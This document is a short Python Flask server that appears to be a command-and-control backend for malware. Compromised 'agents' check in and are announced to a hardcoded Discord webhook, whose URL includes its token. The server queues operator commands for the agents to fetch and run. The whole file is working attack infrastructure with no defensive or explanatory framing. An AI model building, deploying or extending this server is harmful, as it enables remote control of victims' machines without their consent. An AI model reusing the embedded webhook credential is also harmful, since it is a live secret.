import requests
from flask import Flask, request, jsonify

app = Flask(__name__)
command_queue = []

# Replace with your actual Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1483772058558136452/l8maf6eEPYKlDuVF-j64lXjUYF8P3a9Lgq4ixjJpvbmHKsgJdgMs3_F8rkp-eurIelnw"

@app.route('/checkin', methods=['POST'])
def checkin():
    data = request.json
    user = data.get('user', 'Unknown User')
    # Send alert to Discord
    message = {"content": f"!!! NEW AGENT FOUND: {user} !!!"}
    try:
        requests.post(WEBHOOK_URL, json=message)
    except Exception as e:
        print(f"Webhook failed: {e}")
    return jsonify({"status": "acknowledged"}), 200

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    command_queue.append(data.get('command'))
    return jsonify({"status": "command_queued"}), 200

@app.route('/get_command', methods=['GET'])
def get_command():
    if command_queue:
        return jsonify({"command": command_queue.pop(0)}), 200
    return jsonify({"command": "none"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
